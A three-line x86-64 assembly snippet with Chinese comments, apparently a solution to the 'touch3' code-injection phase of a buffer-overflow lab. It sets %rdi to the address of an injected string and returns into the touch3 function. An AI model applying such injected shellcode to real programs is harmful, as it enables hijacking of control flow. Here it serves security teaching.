movq $0x5561dca8, %rdi  #注入字符串的首地址
pushq $0x4018fa         #touch3的首地址
retq
